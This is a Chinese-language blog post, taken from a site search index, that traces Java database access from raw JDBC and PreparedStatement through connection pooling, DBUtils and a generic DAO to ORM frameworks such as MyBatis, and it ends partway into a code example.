<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>从 JDBC 到 ORM（例：Mybatis）的演化过程</title>
      <link href="/2022/11/29/%E6%95%B0%E6%8D%AE%E5%BA%93/%E4%BB%8E%20JDBC%20%E5%88%B0%20ORM%EF%BC%88%E4%BE%8B%EF%BC%9AMybatis%EF%BC%89%E7%9A%84%E6%BC%94%E5%8C%96%E8%BF%87%E7%A8%8B/"/>
      <url>/2022/11/29/%E6%95%B0%E6%8D%AE%E5%BA%93/%E4%BB%8E%20JDBC%20%E5%88%B0%20ORM%EF%BC%88%E4%BE%8B%EF%BC%9AMybatis%EF%BC%89%E7%9A%84%E6%BC%94%E5%8C%96%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="从-JDBC-到-ORM（例：Mybatis）的演化过程"><a href="#从-JDBC-到-ORM（例：Mybatis）的演化过程" class="headerlink" title="从 JDBC 到 ORM（例：Mybatis）的演化过程"></a>从 JDBC 到 ORM（例：Mybatis）的演化过程</h1><p>​    下面我将介绍Java操作Mysql数据的方式的演化过程，从最基本的JDBC到ORM框架的实现，每一次演化都是为了解决现有存在的问题。</p><h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><p>这里需要加入Mysql驱动包或者依赖.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.13<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="comment">// 注册驱动</span></span><br><span class="line">    <span class="type">Driver</span> <span class="variable">driver</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.mysql.jdbc.Driver();</span><br><span class="line">    <span class="comment">// 设置配置</span></span><br><span class="line">    <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">    properties.setProperty(<span class="string">&quot;user&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">    properties.setProperty(<span class="string">&quot;password&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/orm&quot;</span>;</span><br><span class="line">    <span class="comment">// 获取连接</span></span><br><span class="line">    <span class="type">Connection</span> <span class="variable">connect</span> <span class="operator">=</span> driver.connect(url, properties);</span><br><span class="line">    <span class="comment">// 执行SQL</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from user&quot;</span>;</span><br><span class="line">    <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connect.createStatement();</span><br><span class="line">    <span class="comment">// 返回结果</span></span><br><span class="line">    <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery(sql);</span><br><span class="line">    <span class="comment">// 结束资源</span></span><br><span class="line">    resultSet.close();</span><br><span class="line">    statement.close();</span><br><span class="line">    connect.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    可以看到我们是通过<code>Statement</code>去执行的SQL语句，这里是存在SQL注入风险的，简单来说就是SQL是字符串拼接的，如果有恶意参数，会影响整个SQL的意思，所以后面我们使用<code>PreparedStatement </code>，也叫做预处理，执行SQL语句的参数用<code>(?)</code>来表示,使用set方法插入值。好处：1. 防止SQL注入 2. 减少编译次数，效率高 3. 不在使用SQL拼接，减少语法错误。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="comment">// 注册驱动</span></span><br><span class="line">    <span class="type">Driver</span> <span class="variable">driver</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.mysql.jdbc.Driver();</span><br><span class="line">    <span class="comment">// 设置配置</span></span><br><span class="line">    <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">    properties.setProperty(<span class="string">&quot;user&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">    properties.setProperty(<span class="string">&quot;password&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/orm&quot;</span>;</span><br><span class="line">    <span class="comment">// 获取连接</span></span><br><span class="line">    <span class="type">Connection</span> <span class="variable">connect</span> <span class="operator">=</span> driver.connect(url, properties);</span><br><span class="line">    <span class="comment">// 执行SQL</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from user where username =?&quot;</span>;</span><br><span class="line">    <span class="type">PreparedStatement</span> <span class="variable">statement</span> <span class="operator">=</span> connect.prepareStatement(sql);</span><br><span class="line">    statement.setString(<span class="number">1</span>,<span class="string">&quot;steak&quot;</span>);</span><br><span class="line">    <span class="comment">// 返回结果</span></span><br><span class="line">    <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery();</span><br><span class="line">    <span class="comment">// 结束资源</span></span><br><span class="line">    resultSet.close();</span><br><span class="line">    statement.close();</span><br><span class="line">    connect.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="封装JDBC工具类"><a href="#封装JDBC工具类" class="headerlink" title="封装JDBC工具类"></a>封装JDBC工具类</h2><p>​    上面的操作，其中资源配置都是固定操作，所以我们可以直接写一个工具类来每次获取连接，进行操作，释放资源。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDBCUtils</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String username;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String password;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String url;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String driver;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">            <span class="comment">// 将配置写入配置文件，更加灵活</span></span><br><span class="line">            properties.load(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;src\\mysql.properties&quot;</span>));</span><br><span class="line">            username = properties.getProperty(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">            password = properties.getProperty(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">            url = properties.getProperty(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">            driver = properties.getProperty(<span class="string">&quot;driver&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title function_">getConnection</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> DriverManager.getConnection(url, username, password);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">(ResultSet set, Statement statement, Connection connection)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">if</span> (set != <span class="literal">null</span>)&#123;</span><br><span class="line">            set.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (statement != <span class="literal">null</span>) &#123;</span><br><span class="line">            set.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (connection != <span class="literal">null</span>) &#123;</span><br><span class="line">            connection.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用连接池"><a href="#使用连接池" class="headerlink" title="使用连接池"></a>使用连接池</h2><p>​    在上面我们每次操作数据库时，都是获取连接，操作，断开连接。</p><p>​    传统的JDBC操作会频繁的请求和验证，占用很多系统资源，导致服务崩溃，如果程序出现问题未能正常关闭，将导致数据库内存泄露，组织共导致重启数据库。</p><p>​    而且不能控制连接的数量，如果连接过多，可能导致Mysql崩溃。所以我们引入了连接池，让连接复用。这里我使用德鲁伊连接池，只用引入先关依赖即可：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>这里我直接把原先的获取连接方式，改为使用连接池获取。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.DruidDataSourceFactory;</span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDBCUtils</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> DataSource dataSource;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">            <span class="comment">// 将配置写入配置文件</span></span><br><span class="line">            properties.load(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;src\\mysql.properties&quot;</span>));</span><br><span class="line">            dataSource = DruidDataSourceFactory.createDataSource(properties);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title function_">getConnection</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> dataSource.getConnection();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">(ResultSet set, Statement statement, Connection connection)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">if</span> (set != <span class="literal">null</span>)&#123;</span><br><span class="line">            set.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (statement != <span class="literal">null</span>) &#123;</span><br><span class="line">            set.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 在数据库连接池技术中，close 不是真的断掉连接，而是把使用的 Connection 对象放回连接池</span></span><br><span class="line">        <span class="keyword">if</span> (connection != <span class="literal">null</span>) &#123;</span><br><span class="line">            connection.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Apache—DBUtils"><a href="#Apache—DBUtils" class="headerlink" title="Apache—DBUtils"></a>Apache—DBUtils</h2><p>​    上面的操作存在一个问题，关闭connection之后，resultSet结果集无法使用，且resultSet不利于数据的管理，所以每次我们查询了数据，可以手动的添加到List，Map等容器使用。还存在一个问题，每次查询返回的都是ResultSet，能不能通过泛型和反射，直接将数据封装成对象或者到List中。这些操作就被<code>Apache—DBUtils</code>完成了，是Apache提供的开源JDBC工具类库，且内部对SQL执行进行了线程安全保证。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-dbutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-dbutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> JDBCUtils.getConnection();</span><br><span class="line">    <span class="type">QueryRunner</span> <span class="variable">queryRunner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QueryRunner</span>();</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from user where id &gt;= ?&quot;</span>;</span><br><span class="line">    List&lt;User&gt; list = queryRunner.query(connection, sql, <span class="keyword">new</span> <span class="title class_">BeanListHandler</span>&lt;&gt;(User.class));</span><br><span class="line">    JDBCUtils.close(<span class="literal">null</span>, <span class="literal">null</span>, connection);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="DAO与增删改查通用方法-BasicDao"><a href="#DAO与增删改查通用方法-BasicDao" class="headerlink" title="DAO与增删改查通用方法-BasicDao"></a>DAO与增删改查通用方法-BasicDao</h2><blockquote><p>Dao : data access object 数据访问对象</p></blockquote><p>​    我们希望将增删改查一些公共的方法抽取出来，BasicDao是专门和数据库交互的，在BasicDao的基础上，实现一张表对应一个Dao，更好的完成功能，比如Customer表对应就是CustomerDao。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.dbutils.QueryRunner;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.dbutils.handlers.BeanHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.dbutils.handlers.BeanListHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.dbutils.handlers.ScalarHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasicDAO</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">QueryRunner</span> <span class="variable">qr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QueryRunner</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 增删改操作</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">update</span><span class="params">(String sql, Object... parameters)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            connection = JDBCUtils.getConnection();</span><br><span class="line">            <span class="type">int</span> <span class="variable">update</span> <span class="operator">=</span> qr.update(connection, sql, parameters);</span><br><span class="line">            <span class="keyword">return</span> update;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e); <span class="comment">//将编译异常-&gt;运行异常 ,抛出</span></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            JDBCUtils.close(<span class="literal">null</span>, <span class="literal">null</span>, connection);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查询并封装多个对象</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;T&gt; <span class="title function_">queryMulti</span><span class="params">(String sql, Class&lt;T&gt; clazz, Object... parameters)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            connection = JDBCUtils.getConnection();</span><br><span class="line">            <span class="keyword">return</span> qr.query(connection, sql, <span class="keyword">new</span> <span class="title class_">BeanListHandler</span>&lt;T&gt;(clazz), parameters);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            JDBCUtils.close(<span class="literal">null</span>, <span class="literal">null</span>, connection);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查询并封装单个对象</span></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">querySingle</span><span class="params">(String sql, Class&lt;T&gt; clazz, Object... parameters)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            connection = JDBCUtils.getConnection();</span><br><span class="line">            <span class="keyword">return</span> qr.query(connection, sql, <span class="keyword">new</span> <span class="title class_">BeanHandler</span>&lt;T&gt;(clazz), parameters);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            <span class="comment">//将编译异常-&gt;运行异常 ,抛出</span></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            JDBCUtils.close(<span class="literal">null</span>, <span class="literal">null</span>, connection);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查询一个值</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">queryScalar</span><span class="params">(String sql, Object... parameters)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            connection = JDBCUtils.getConnection();</span><br><span class="line">            <span class="keyword">return</span> qr.query(connection, sql, <span class="keyword">new</span> <span class="title class_">ScalarHandler</span>(), parameters);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            JDBCUtils.close(<span class="literal">null</span>, <span class="literal">null</span>, connection);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CustomerDao</span> <span class="keyword">extends</span> <span class="title class_">BasicDAO</span>&lt;CustomerDao&gt; &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 封装自己的方法，并且由于是BasicDao的子类，可直接使用其定义的方法</span></span><br><span class="line"><span class="comment">     * 由于指定了泛型，也可以直接返回封装好的对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ORM"><a href="#ORM" class="headerlink" title="ORM"></a>ORM</h2><blockquote><p>是什么？</p></blockquote><p>​    对象关系映射（Object Relational Mapping，简称ORM）模式是一种<code>为了解决面向对象与关系数据库存在的互不匹配的现象的技术</code>。简单的说，ORM是通过使用描述对象和数据库之间映射的元数据，将程序中的对象自动持久化到关系数据库中。</p><p>​    也就是说我们能不能不写死SQL，将一个模型类与数据库中一张表做映射关系。我们只面向对象操作，比如<code>save(new User)</code>表示保存User对象到数据库中，一般我们会把User类与数据库中User表进行匹配与映射。这样我们也不用<strong>直接</strong>写SQL了。</p><blockquote><p>ORM的优缺点 </p></blockquote><p>优点：简单，直接，面向对象操作</p><p>缺点：会牺牲程序的执行效率和会固定思维模式。 （用多了，SQL可能都不会写了，而且提供的方法是有限的，但你的需求是无限的，我深有体会，这里感谢鱼皮对我的帮助）。</p><blockquote><p>常见ORM框架</p></blockquote><ol><li>Mybatis 、Mybatis-plus（常用，直接看官方文档操作）</li><li>Hibernate</li></ol><p>​    </p><p>​    上面就是Java对数据库操作的演化过程，各个阶段的代码只做了简单的演示，感兴趣可以再深入学习，我现在是常用Mybatis-plus，但由于傻瓜式操作，我更想了解一下底层，所以在想我们能不能自己写一个简单的ORM，不需要很完善，可以表达思想即可，这里我看了一篇文章写的很棒，下面的代码也是基于该作者的。</p><p>详情链接：<a href="https://cloud.tencent.com/developer/article/2057369?from=article.detail.1803564">https://cloud.tencent.com/developer/article/2057369?from=article.detail.1803564</a></p><p>​    这里我们先声明一点，不管是什么操作，Mysql都是只认SQL，既然现在我们是面向对象操作，不去自己写SQL，那ORM底层就一定会通过某些操作，将我们的对象操作转写为SQL语句，最后执行。底层实际上还是基础的部分，只不过我们套了个壳子，让使用更方便了而已，这里需要的基本知识：<code>注解，反射，JDBC基础</code>。</p><h3 id="代码演示"><a href="#代码演示" class="headerlink" title="代码演示"></a>代码演示</h3><blockquote><p>我们既然要将实体类与数据库表做映射，那我们就应该在类上声明，它对应的哪个表。我们使用@Table 来声明</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 